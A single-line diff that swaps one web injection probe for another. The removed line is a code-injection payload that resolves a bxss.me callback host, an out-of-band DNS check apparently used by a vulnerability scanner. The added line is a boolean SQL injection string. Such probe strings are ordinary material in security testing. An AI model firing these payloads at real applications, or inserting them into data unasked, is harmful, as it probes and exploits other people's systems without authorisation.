@@ -1,1 +1,1 @@
-gethostbyname(lc('hitzj'.'jwdiuxnu8ab34.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(115).chr(78).chr(120).chr(68)
+-1" OR 3*2<(0+5+518-518) -- 
